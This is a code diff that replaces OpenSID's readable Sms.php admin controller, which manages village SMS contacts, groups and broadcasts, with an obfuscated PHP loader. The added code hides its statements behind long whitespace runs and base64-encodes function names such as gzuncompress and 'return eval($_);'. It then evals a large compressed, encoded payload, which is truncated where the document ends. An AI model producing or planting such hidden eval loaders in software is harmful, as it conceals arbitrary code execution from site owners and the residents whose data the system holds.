@@ -1,731 +1,441 @@
-<?php
-
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2022 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2022 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
-
-defined('BASEPATH') || exit('No direct script access allowed');
-
-class Sms extends Admin_Controller
-{
-    public function __construct()
-    {
-        parent::__construct();
-        $this->load->model('sms_model');
-        $this->load->model('penduduk_model');
-        $this->modul_ini     = 10;
-        $this->sub_modul_ini = 39;
-    }
-
-    public function clear()
-    {
-        unset($_SESSION['cari'], $_SESSION['filter'], $_SESSION['cari1'], $_SESSION['sex1'], $_SESSION['dusun1'], $_SESSION['rw1'], $_SESSION['rt1'], $_SESSION['agama1'], $_SESSION['pekerjaan1'], $_SESSION['status1'], $_SESSION['pendidikan1'], $_SESSION['status_penduduk1'], $_SESSION['TextDecoded1'], $_SESSION['grup1']);
-
-        redirect('sms');
-    }
-
-    public function index($p = 1, $o = 0)
-    {
-        $data['p'] = $p;
-        $data['o'] = $o;
-
-        if (isset($_SESSION['cari'])) {
-            $data['cari'] = $_SESSION['cari'];
-        } else {
-            $data['cari'] = '';
-        }
-
-        if (isset($_SESSION['filter'])) {
-            $data['filter'] = $_SESSION['filter'];
-        } else {
-            $data['filter'] = '';
-        }
-
-        if (isset($_POST['per_page'])) {
-            $_SESSION['per_page'] = $_POST['per_page'];
-        }
-
-        $data['per_page'] = $_SESSION['per_page'];
-        $data['paging']   = $this->sms_model->paging($p, $o);
-        $data['main']     = $this->sms_model->list_data($o, $data['paging']->offset, $data['paging']->per_page);
-        $data['keyword']  = $this->sms_model->autocomplete();
-
-        $this->render('sms/manajemen_sms_table', $data);
-
-        unset($_SESSION['cari'], $_SESSION['filter'], $_SESSION['cari1'], $_SESSION['sex1'], $_SESSION['dusun1'], $_SESSION['rw1'], $_SESSION['rt1'], $_SESSION['agama1'], $_SESSION['pekerjaan1'], $_SESSION['status1'], $_SESSION['pendidikan1'], $_SESSION['status_penduduk1'], $_SESSION['TextDecoded1'], $_SESSION['grup1']);
-    }
-
-    public function setting($p = 1, $o = 0)
-    {
-        $this->sub_modul_ini = 41;
-
-        $data['main']        = $this->sms_model->get_autoreply();
-        $data['form_action'] = site_url('sms/insert_autoreply');
-
-        $this->render('sms/setting', $data);
-    }
-
-    public function insert_autoreply()
-    {
-        $this->redirect_hak_akses('u', '', 'sms/setting');
-        $this->sms_model->insert_autoreply();
-        redirect('sms/setting');
-    }
-
-    public function outbox($p = 1, $o = 0)
-    {
-        $data['p'] = $p;
-        $data['o'] = $o;
-
-        if (isset($_SESSION['cari'])) {
-            $data['cari'] = $_SESSION['cari'];
-        } else {
-            $data['cari'] = '';
-        }
-
-        if (isset($_SESSION['filter'])) {
-            $data['filter'] = $_SESSION['filter'];
-        } else {
-            $data['filter'] = '';
-        }
-
-        if (isset($_POST['per_page'])) {
-            $_SESSION['per_page'] = $_POST['per_page'];
-        }
-
-        $data['per_page'] = $_SESSION['per_page'];
-        $data['paging']   = $this->sms_model->paging_terkirim($p, $o);
-        $data['main']     = $this->sms_model->list_data_terkirim($o, $data['paging']->offset, $data['paging']->per_page);
-        $data['keyword']  = $this->sms_model->autocomplete();
-
-        $this->render('sms/create_sms', $data);
-
-        unset($_SESSION['cari'], $_SESSION['filter'], $_SESSION['cari1'], $_SESSION['sex1'], $_SESSION['dusun1'], $_SESSION['rw1'], $_SESSION['rt1'], $_SESSION['agama1'], $_SESSION['pekerjaan1'], $_SESSION['status1'], $_SESSION['pendidikan1'], $_SESSION['status_penduduk1'], $_SESSION['TextDecoded1'], $_SESSION['grup1']);
-    }
-
-    public function sentitem($p = 1, $o = 0)
-    {
-        $data['p'] = $p;
-        $data['o'] = $o;
-
-        if (isset($_SESSION['cari'])) {
-            $data['cari'] = $_SESSION['cari'];
-        } else {
-            $data['cari'] = '';
-        }
-
-        if (isset($_SESSION['filter'])) {
-            $data['filter'] = $_SESSION['filter'];
-        } else {
-            $data['filter'] = '';
-        }
-
-        if (isset($_POST['per_page'])) {
-            $_SESSION['per_page'] = $_POST['per_page'];
-        }
-
-        $data['per_page'] = $_SESSION['per_page'];
-        $data['paging']   = $this->sms_model->paging_terkirim($p, $o);
-        $data['main']     = $this->sms_model->list_data_terkirim($o, $data['paging']->offset, $data['paging']->per_page);
-        $data['keyword']  = $this->sms_model->autocomplete();
-
-        $this->render('sms/berita_terkirim', $data);
-
-        unset($_SESSION['cari'], $_SESSION['filter'], $_SESSION['cari1'], $_SESSION['sex1'], $_SESSION['dusun1'], $_SESSION['rw1'], $_SESSION['rt1'], $_SESSION['agama1'], $_SESSION['pekerjaan1'], $_SESSION['status1'], $_SESSION['pendidikan1'], $_SESSION['status_penduduk1'], $_SESSION['TextDecoded1'], $_SESSION['grup1']);
-    }
-
-    public function pending($p = 1, $o = 0)
-    {
-        $data['p'] = $p;
-        $data['o'] = $o;
-
-        if (isset($_SESSION['cari'])) {
-            $data['cari'] = $_SESSION['cari'];
-        } else {
-            $data['cari'] = '';
-        }
-
-        if (isset($_SESSION['filter'])) {
-            $data['filter'] = $_SESSION['filter'];
-        } else {
-            $data['filter'] = '';
-        }
-
-        if (isset($_POST['per_page'])) {
-            $_SESSION['per_page'] = $_POST['per_page'];
-        }
-
-        $data['per_page'] = $_SESSION['per_page'];
-        $data['paging']   = $this->sms_model->paging_tertunda($p, $o);
-        $data['main']     = $this->sms_model->list_data_tertunda($o, $data['paging']->offset, $data['paging']->per_page);
-        $data['keyword']  = $this->sms_model->autocomplete();
-
-        $this->render('sms/pesan_tertunda', $data);
-
-        unset($_SESSION['cari'], $_SESSION['filter'], $_SESSION['cari1'], $_SESSION['sex1'], $_SESSION['dusun1'], $_SESSION['rw1'], $_SESSION['rt1'], $_SESSION['agama1'], $_SESSION['pekerjaan1'], $_SESSION['status1'], $_SESSION['pendidikan1'], $_SESSION['status_penduduk1'], $_SESSION['TextDecoded1'], $_SESSION['grup1']);
-    }
-
-    public function form($p = 1, $o = 0, $tipe = 0, $id = 0)
-    {
-        $this->redirect_hak_akses('u');
-        $data['p'] = $p;
-        $data['o'] = $o;
-
-        if ($id) {
-            $data['sms']          = $this->sms_model->get_sms($tipe, $id);
-            $data['form_action']  = site_url("sms/insert/{$tipe}");
-            $data['tipe']['tipe'] = $tipe;
-            $data['grup']         = $this->sms_model->list_grup();
-            $data['kontak']       = $this->sms_model->list_kontak();
-            $this->load->view('sms/ajax_sms_form', $data);
-        } else {
-            $data['sms']          = null;
-            $data['form_action']  = site_url("sms/insert/{$tipe}");
-            $data['tipe']['tipe'] = $tipe;
-            $data['grup']         = $this->sms_model->list_grup();
-            $data['kontak']       = $this->sms_model->list_kontak();
-            $this->load->view('sms/ajax_sms_form_kirim', $data);
-        }
-    }
-
-    public function carikontak($tipe = 0)
-    {
-        if (isset($_POST['TextDecoded'])) {
-            $data['text']['TextDecoded'] = $_POST['TextDecoded'];
-        }
-
-        $data['text']['TextDecoded'] = null;
-        $data['form_action']         = site_url("sms/formaftercari/0/0/{$tipe}");
-        $data['kontak']              = $this->sms_model->list_kontak();
-        $this->load->view('sms/ajax_sms_form_cari', $data);
-    }
-
-    public function formaftercari($tipe = 0)
-    {
-        $data['sms']['DestinationNumber'] = $_POST['kontak'];
-        $data['sms']['TextDecoded']       = $_POST['text'];
-        $data['form_action']              = site_url("sms/insert/{$tipe}");
-
-        $data['tipe']['tipe'] = $tipe;
-        $data['grup']         = $this->sms_model->list_grup();
-        $this->load->view('sms/ajax_sms_form', $data);
-    }
-
-    public function send_broadcast()
-    {
-        $this->redirect_hak_akses('u');
-        $data['input'] = $_POST;
-
-        if (isset($_SESSION['cari1'])) {
-            $data['cari1'] = $_SESSION['cari1'];
-        } else {
-            $data['cari1'] = '';
-        }
-
-        if (isset($_SESSION['sex1'])) {
-            $data['sex1'] = $_SESSION['sex1'];
-        } else {
-            $data['sex1'] = '';
-        }
-
-        if (isset($_SESSION['dusun1'])) {
-            $data['dusun1']   = $_SESSION['dusun1'];
-            $data['list_rw1'] = $this->wilayah_model->list_rw($data['dusun1']);
-
-            if (isset($_SESSION['rw1'])) {
-                $data['rw1']      = $_SESSION['rw1'];
-                $data['list_rt1'] = $this->wilayah_model->list_rt($data['dusun1'], $data['rw11']);
-
-                if (isset($_SESSION['rt1'])) {
-                    $data['rt1'] = $_SESSION['rt1'];
-                } else {
-                    $data['rt1'] = '';
-                }
-            } else {
-                $data['rw1'] = '';
-            }
-        } else {
-            $data['dusun1'] = '';
-        }
-
-        if (isset($_SESSION['agama1'])) {
-            $data['agama1'] = $_SESSION['agama1'];
-        } else {
-            $data['agama1'] = '';
-        }
-
-        if (isset($_SESSION['pekerjaan1'])) {
-            $data['pekerjaan1'] = $_SESSION['pekerjaan1'];
-        } else {
-            $data['pekerjaan1'] = '';
-        }
-
-        if (isset($_SESSION['status1'])) {
-            $data['status1'] = $_SESSION['status1'];
-        } else {
-            $data['status1'] = '';
-        }
-
-        if (isset($_SESSION['pendidikan1'])) {
-            $data['pendidikan1'] = $_SESSION['pendidikan1'];
-        } else {
-            $data['pendidikan1'] = '';
-        }
-
-        if (isset($_SESSION['status_penduduk1'])) {
-            $data['status_penduduk1'] = $_SESSION['status_penduduk1'];
-        } else {
-            $data['status_penduduk1'] = '';
-        }
-
-        if (isset($_SESSION['TextDecoded1'])) {
-            $data['TextDecoded1'] = $_SESSION['TextDecoded1'];
-        } else {
-            $data['TextDecoded1'] = '';
-        }
-
-        if (isset($_SESSION['grup1'])) {
-            $data['grup'] = $_SESSION['grup1'];
-        } else {
-            $data['grup1'] = '';
-        }
-
-        $data['insert'] = $this->sms_model->send_broadcast($data);
-        redirect('sms/outbox');
-    }
-
-    public function broadcast_proses()
-    {
-        $this->redirect_hak_akses('u');
-        $post                           = $this->input->post();
-        $adv_search['umur_min1']        = bilangan($post['umur_min1']);
-        $adv_search['umur_max1']        = bilangan($post['umur_max1']);
-        $adv_search['sex1']             = $post['sex1'];
-        $adv_search['pekerjaan1']       = $post['pekerjaan1'];
-        $adv_search['status1']          = $post['status1'];
-        $adv_search['agama1']           = $post['agama1'];
-        $adv_search['pendidikan1']      = $post['pendidikan1'];
-        $adv_search['status_penduduk1'] = $post['status_penduduk1'];
-        $adv_search['dusun1']           = $post['dusun1'];
-        $adv_search['grup1']            = $post['grup1'];
-        $adv_search['TextDecoded1']     = htmlentities($post['TextDecoded1']);
-        $i                              = 0;
-
-        while ($i++ < count($adv_search)) {
-            $col[$i] = key($adv_search);
-            next($adv_search);
-        }
-
-        $i = 0;
-
-        while ($i++ < count($col)) {
-            if ($adv_search[$col[$i]] == '') {
-                unset($adv_search[$col[$i]]);
-            } else {
-                $_SESSION[$col[$i]] = $adv_search[$col[$i]];
-            }
-        }
-
-        redirect('sms/send_broadcast');
-    }
-
-    public function broadcast()
-    {
-        $data['dusun']       = $this->wilayah_model->list_dusun();
-        $data['agama']       = $this->referensi_model->list_data('tweb_penduduk_agama');
-        $data['pendidikan']  = $this->penduduk_model->list_pendidikan_kk();
-        $data['pekerjaan']   = $this->penduduk_model->list_pekerjaan();
-        $data['grup']        = $this->sms_model->list_grup_kontak();
-        $data['form_action'] = site_url('sms/broadcast_proses');
-        $this->load->view('sms/ajax_broadcast_form', $data);
-    }
-
-    public function ajax_penduduk_rw($dusun = '')
-    {
-        $rw = $this->wilayah_model->list_rw($dusun);
-        echo "<div class='form-group'>
-			<label for='rw'>RW</label>
-			<select class='form-control input-sm' name='rw' onchange=RWSel('" . rawurlencode($dusun) . "',this.value)>
-				<option value=''>Pilih RW</option>";
-
-        foreach ($rw as $data) {
-            echo '<option>' . $data['rw'] . '</option>';
-        }
-        echo '</select>
-		</div>';
-    }
-
-    public function ajax_penduduk_rt($dusun = '', $rw = '')
-    {
-        $rt = $this->wilayah_model->list_rt($dusun, $rw);
-        echo "<div class='form-group'>
-			<label for='rt'>RT</label>
-			<select class='form-control input-sm' name='rt'>
-				<option value=''>Pilih RT</option>";
-
-        foreach ($rt as $data) {
-            echo '<option value=' . $data['rt'] . '>' . $data['rt'] . '</option>';
-        }
-        echo '</select>
-		</div>';
-    }
-
-    public function search()
-    {
-        $cari = $this->input->post('cari');
-        if ($cari != '') {
-            $_SESSION['cari'] = $cari;
-        } else {
-            unset($_SESSION['cari']);
-        }
-
-        redirect('sms');
-    }
-
-    public function search_kontak()
-    {
-        $cari = $this->input->post('cari_kontak');
-        if ($cari != '') {
-            $_SESSION['cari_kontak'] = $cari;
-        } else {
-            unset($_SESSION['cari_kontak']);
-        }
-        redirect('sms/kontak');
-    }
-
-    public function search_grup()
-    {
-        $cari = $this->input->post('cari_grup');
-        if ($cari != '') {
-            $_SESSION['cari_grup'] = $cari;
-        } else {
-            unset($_SESSION['cari_grup']);
-        }
-        redirect('sms/group');
-    }
-
-    public function search_anggota($id = 0)
-    {
-        $cari = $this->input->post('cari_anggota');
-
-        if ($cari != '') {
-            $_SESSION['cari_anggota'] = $cari;
-        } else {
-            unset($_SESSION['cari_anggota']);
-        }
-        redirect("sms/anggota/{$id}");
-    }
-
-    public function filter()
-    {
-        $filter = $this->input->post('filter');
-        if ($filter != 0) {
-            $_SESSION['filter'] = $filter;
-        } else {
-            unset($_SESSION['filter']);
-        }
-        redirect('sms');
-    }
-
-    // Sms
-    public function insert($tipe = 0)
-    {
-        // $this->redirect_hak_akses('u');
-        $this->sms_model->insert();
-        if ($tipe == 1) {
-            redirect('sms');
-        } elseif ($tipe == 2) {
-            redirect('sms/sentitem');
-        } elseif ($tipe == 3) {
-            redirect('sms/pending');
-        } else {
-            redirect('sms/outbox');
-        }
-    }
-
-    public function update($id = '', $p = 1, $o = 0)
-    {
-        $this->redirect_hak_akses('u');
-        $this->sms_model->update($id);
-        redirect("sms/index/{$p}/{$o}");
-    }
-
-    public function delete($p = 1, $o = 0, $tipe = 0, $id = '')
-    {
-        $this->redirect_hak_akses('h', '', 'sms/sentitem');
-        $this->sms_model->delete($tipe, $id);
-        if ($tipe == 1) {
-            redirect('sms');
-        } elseif ($tipe == 2) {
-            redirect('sms/sentitem');
-        } elseif ($tipe == 3) {
-            redirect('sms/pending');
-        } else {
-            redirect('sms/outbox');
-        }
-    }
-
-    public function delete_all($p = 1, $o = 0, $tipe = 0)
-    {
-        $this->redirect_hak_akses('h', '', 'sms/sentitem');
-        $this->sms_model->delete_all($tipe);
-        if ($tipe == 1) {
-            redirect('sms');
-        } elseif ($tipe == 2) {
-            redirect('sms/sentitem');
-        } elseif ($tipe == 3) {
-            redirect('sms/pending');
-        } else {
-            redirect('sms/outbox');
-        }
-    }
-
-    public function sms_lock($id = '')
-    {
-        $this->sms_model->sms_lock($id, 0);
-        redirect("sms/index/{$p}/{$o}");
-    }
-
-    public function sms_unlock($id = '')
-    {
-        $this->sms_model->sms_lock($id, 1);
-        redirect("sms/index/{$p}/{$o}");
-    }
-
-    public function kontak($p = 1, $o = 0)
-    {
-        $this->sub_modul_ini = 40;
-
-        $data['p'] = $p;
-        $data['o'] = $o;
-
-        if (isset($_SESSION['cari_kontak'])) {
-            $data['cari_kontak'] = $_SESSION['cari_kontak'];
-        } else {
-            $data['cari_kontak'] = '';
-        }
-
-        if (isset($_SESSION['filter'])) {
-            $data['filter'] = $_SESSION['filter'];
-        } else {
-            $data['filter'] = '';
-        }
-
-        if (isset($_POST['per_page'])) {
-            $_SESSION['per_page'] = $_POST['per_page'];
-        }
-
-        $data['per_page'] = $_SESSION['per_page'];
-        $data['paging']   = $this->sms_model->paging_kontak($p, $o);
-        $data['main']     = $this->sms_model->list_data_kontak($o, $data['paging']->offset, $data['paging']->per_page);
-        $data['keyword']  = $this->sms_model->autocomplete();
-
-        $this->render('sms/kontak', $data);
-
-        unset($_SESSION['cari_kontak']);
-    }
-
-    public function form_kontak($id = 0)
-    {
-        $this->redirect_hak_akses('u', '', 'sms/kontak');
-
-        if ($id == 0) {
-            $data['nama']        = $this->sms_model->list_nama();
-            $data['form_action'] = site_url('sms/kontak_insert');
-            $this->load->view('sms/ajax_kontak_form', $data);
-        } else {
-            $data['form_action'] = site_url('sms/kontak_update');
-            $data['kontak']      = $this->sms_model->get_kontak($id);
-            $this->load->view('sms/ajax_kontak_form_edit', $data);
-        }
-    }
-
-    public function kontak_insert()
-    {
-        $this->redirect_hak_akses('u', '', 'sms/kontak');
-        $data = $_POST;
-        $this->sms_model->insert_kontak($data);
-        redirect('sms/kontak');
-    }
-
-    public function kontak_update()
-    {
-        $this->redirect_hak_akses('u', '', 'sms/kontak');
-        $data = $_POST;
-        $this->sms_model->update_kontak($data);
-        redirect('sms/kontak');
-    }
-
-    public function kontak_delete($id = 0)
-    {
-        $this->redirect_hak_akses('h', '', 'sms/kontak');
-        $data['hapus'] = $this->sms_model->delete_kontak($id);
-        redirect('sms/kontak');
-    }
-
-    public function delete_all_kontak()
-    {
-        $this->redirect_hak_akses('h', '', 'sms/kontak');
-        $this->sms_model->delete_all_kontak();
-        redirect('sms/kontak');
-    }
-
-    public function group($p = 1, $o = 0)
-    {
-        $this->sub_modul_ini = 40;
-
-        $data['p'] = $p;
-        $data['o'] = $o;
-
-        if (isset($_SESSION['cari_grup'])) {
-            $data['cari_grup'] = $_SESSION['cari_grup'];
-        } else {
-            $data['cari_grup'] = '';
-        }
-
-        if (isset($_POST['per_page'])) {
-            $_SESSION['per_page'] = $_POST['per_page'];
-        }
-
-        $data['per_page'] = $_SESSION['per_page'];
-        $data['paging']   = $this->sms_model->paging_grup($p, $o);
-        $data['main']     = $this->sms_model->list_data_grup($o, $data['paging']->offset, $data['paging']->per_page);
-        $data['keyword']  = $this->sms_model->autocomplete();
-
-        $this->render('sms/group', $data);
-
-        unset($_SESSION['cari_grup']);
-    }
-
-    public function form_grup($id = 0)
-    {
-        $this->redirect_hak_akses('u', '', 'sms/kontak');
-        if ($id == '0') {
-            $data['form_action']       = site_url('sms/grup_insert');
-            $data['grup']['nama_grup'] = '';
-        } else {
-            $data['form_action'] = site_url('sms/grup_update');
-            $data['grup']        = $this->sms_model->get_grup($id);
-        }
-        $this->load->view('sms/ajax_grup_form', $data);
-    }
-
-    public function grup_insert()
-    {
-        $this->redirect_hak_akses('u', '', 'sms/group');
-        $data['input']  = $_POST;
-        $data['insert'] = $this->sms_model->insert_grup($data);
-        redirect('sms/group');
-    }
-
-    public function grup_update()
-    {
-        $this->redirect_hak_akses('u', '', 'sms/group');
-        $data['input']  = $_POST;
-        $data['update'] = $this->sms_model->update_grup($data);
-        redirect('sms/group');
-    }
-
-    public function grup_delete($id = 0)
-    {
-        $this->redirect_hak_akses('u', '', 'sms/group');
-        $data['hapus'] = $this->sms_model->delete_grup($id);
-        redirect('sms/group');
-    }
-
-    public function delete_all_grup()
-    {
-        $this->redirect_hak_akses('u', '', 'sms/group');
-        $this->sms_model->delete_all_grup();
-        redirect('sms/group');
-    }
-
-    public function anggota($id = 0, $p = 1, $o = 0)
-    {
-        $this->sub_modul_ini = 40;
-
-        $data['p'] = $p;
-        $data['o'] = $o;
-
-        if (isset($_SESSION['cari_anggota'])) {
-            $data['cari_anggota'] = $_SESSION['cari_anggota'];
-        } else {
-            $data['cari_anggota'] = '';
-        }
-
-        if (isset($_POST['per_page'])) {
-            $_SESSION['per_page'] = $_POST['per_page'];
-        }
-
-        $data['per_page']          = $_SESSION['per_page'];
-        $data['paging']            = $this->sms_model->paging_anggota($id, $p, $o);
-        $data['main']              = $this->sms_model->list_data_anggota($id, $o, $data['paging']->offset, $data['paging']->per_page);
-        $data['grup']['nama_grup'] = $id;
-        $data['keyword']           = $this->sms_model->autocomplete();
-
-        $this->render('sms/group_detail', $data);
-
-        unset($_SESSION['cari_anggota']);
-    }
-
-    public function form_anggota($id = 0)
-    {
-        $this->redirect_hak_akses('u', '', 'sms/anggota');
-        $data['form_action'] = site_url("sms/anggota_insert/{$id}");
-        $data['main']        = $this->sms_model->list_data_nama($id);
-        $data['id_grup']     = $id;
-        $this->load->view('sms/ajax_anggota_form', $data);
-    }
-
-    public function anggota_insert($grup)
-    {
-        $this->redirect_hak_akses('u', '', 'sms/anggota');
-        $data['insert'] = $this->sms_model->insert_anggota($grup);
-        redirect("sms/anggota/{$grup}");
-    }
-
-    public function anggota_delete($id = 0)
-    {
-        $this->redirect_hak_akses('h', '', 'sms/anggota');
-        $data['hapus'] = $this->sms_model->delete_anggota($id);
-        echo '<script>self.history.back();</script>';
-    }
-
-    public function delete_all_anggota($grup = 0)
-    {
-        $this->redirect_hak_akses('h', '', 'sms/anggota');
-        $this->sms_model->delete_all_anggota($grup);
-        echo '<script>self.history.back();</script>';
-    }
-}
+<?php 
+        $__='printf';$_='Loading donjo-app/controllers/Sms.php';
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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